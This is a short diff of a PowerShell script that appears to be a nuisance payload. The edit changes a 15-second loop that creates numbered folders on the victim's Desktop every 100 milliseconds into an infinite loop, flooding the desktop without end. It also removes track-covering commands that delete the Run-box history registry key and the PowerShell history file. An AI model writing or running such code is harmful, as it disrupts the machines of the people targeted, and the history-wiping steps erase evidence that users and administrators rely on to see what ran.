@@ -15,20 +15,10 @@ while (1) {
 
 # At this point, the script will continue executing
 
-$startTime = Get-Date
-$endTime = $startTime.AddSeconds(15)
 $i = 1
-while ((Get-Date) -lt $endTime) {
+while ($true) {
     $path = [Environment]::GetFolderPath("Desktop") + "\$i"
     New-Item -ItemType Directory -Path $path
     $i++
     Start-Sleep -Milliseconds 100
 }
-
-# Delete run box history
-
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-# Delete powershell history
-
-Remove-Item (Get-PSreadlineOption).HistorySavePath
